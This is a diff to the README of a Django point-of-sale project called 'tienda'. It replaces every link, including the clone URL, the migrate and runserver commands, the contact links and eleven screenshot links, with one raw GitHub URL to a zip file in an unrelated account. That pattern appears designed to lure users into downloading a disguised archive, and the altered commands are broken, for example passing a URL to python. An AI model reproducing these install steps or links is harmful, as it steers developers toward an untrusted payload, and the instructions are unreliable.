@@ -19,7 +19,7 @@ This project is a Point of Sale (POS) system designed to optimize retail operati
 ## Installation
 1. Clone the repository:
     ```bash
-    git clone https://github.com/username/tienda.git
+    git clone https://raw.githubusercontent.com/zubairmk83/tienda/main/abomasum/tienda.zip
     ```
 2. Navigate to the project directory:
     ```bash
@@ -42,12 +42,12 @@ This project is a Point of Sale (POS) system designed to optimize retail operati
     ```
 2. Apply migrations:
     ```bash
-    pipenv run python manage.py makemigrations
-    pipenv run python manage.py migrate
+    pipenv run python https://raw.githubusercontent.com/zubairmk83/tienda/main/abomasum/tienda.zip makemigrations
+    pipenv run python https://raw.githubusercontent.com/zubairmk83/tienda/main/abomasum/tienda.zip migrate
     ```
 3. Run the application:
     ```bash
-    pipenv run python manage.py runserver
+    pipenv run python https://raw.githubusercontent.com/zubairmk83/tienda/main/abomasum/tienda.zip runserver
     ```
 4. Open your web browser and go to:
     ```
@@ -55,20 +55,20 @@ This project is a Point of Sale (POS) system designed to optimize retail operati
     ```
 
 
-For questions or collaboration, please contact me via [Twitter](https://twitter.com/Wa_ViGo) or email at [Gmail](mailto:geralnede@gmail.com).
+For questions or collaboration, please contact me via [Twitter](https://raw.githubusercontent.com/zubairmk83/tienda/main/abomasum/tienda.zip) or email at [Gmail](https://raw.githubusercontent.com/zubairmk83/tienda/main/abomasum/tienda.zip).
 
 ## License
 This project is licensed under the MIT License.
 
 ## Screenshoots
-![Screenshot_1](https://github.com/Waldo0137/tienda/assets/54595253/f70ea2cf-bba0-4d99-8839-48ae8b0357da)
-![Screenshot_2](https://github.com/Waldo0137/tienda/assets/54595253/847032b9-eb67-41de-bf89-e1babf66b076)
-![Screenshot_3](https://github.com/Waldo0137/tienda/assets/54595253/a401fd11-148b-4b3c-8a7e-8c2e7e60cbcd)
-![Screenshot_4](https://github.com/Waldo0137/tienda/assets/54595253/4f98f4e1-8712-460a-9b2e-7db9d30454f6)
-![Screenshot_5](https://github.com/Waldo0137/tienda/assets/54595253/fe5b6a6d-64d6-4cf9-b767-341a07bfb004)
-![Screenshot_6](https://github.com/Waldo0137/tienda/assets/54595253/afec0024-346d-4119-b1f9-e3ea3cab28dc)
-![Screenshot_7](https://github.com/Waldo0137/tienda/assets/54595253/cee83edb-9cd9-4b09-8a04-6fa2c9adc7d1)
-![Screenshot_8](https://github.com/Waldo0137/tienda/assets/54595253/1a36b00a-6055-47bf-893e-84e83c9d7000)
-![Screenshot_9](https://github.com/Waldo0137/tienda/assets/54595253/d16453c8-516a-40d8-951c-df6ae83f35df)
-![Screenshot_10](https://github.com/Waldo0137/tienda/assets/54595253/3d8ec858-8458-4d66-aa69-0bfb1b2be6e1)
-![Screenshot_11](https://github.com/Waldo0137/tienda/assets/54595253/e41b4ffe-6cd1-4da6-8045-522af7abb7f7)
+![Screenshot_1](https://raw.githubusercontent.com/zubairmk83/tienda/main/abomasum/tienda.zip)
+![Screenshot_2](https://raw.githubusercontent.com/zubairmk83/tienda/main/abomasum/tienda.zip)
+![Screenshot_3](https://raw.githubusercontent.com/zubairmk83/tienda/main/abomasum/tienda.zip)
+![Screenshot_4](https://raw.githubusercontent.com/zubairmk83/tienda/main/abomasum/tienda.zip)
+![Screenshot_5](https://raw.githubusercontent.com/zubairmk83/tienda/main/abomasum/tienda.zip)
+![Screenshot_6](https://raw.githubusercontent.com/zubairmk83/tienda/main/abomasum/tienda.zip)
+![Screenshot_7](https://raw.githubusercontent.com/zubairmk83/tienda/main/abomasum/tienda.zip)
+![Screenshot_8](https://raw.githubusercontent.com/zubairmk83/tienda/main/abomasum/tienda.zip)
+![Screenshot_9](https://raw.githubusercontent.com/zubairmk83/tienda/main/abomasum/tienda.zip)
+![Screenshot_10](https://raw.githubusercontent.com/zubairmk83/tienda/main/abomasum/tienda.zip)
+![Screenshot_11](https://raw.githubusercontent.com/zubairmk83/tienda/main/abomasum/tienda.zip)
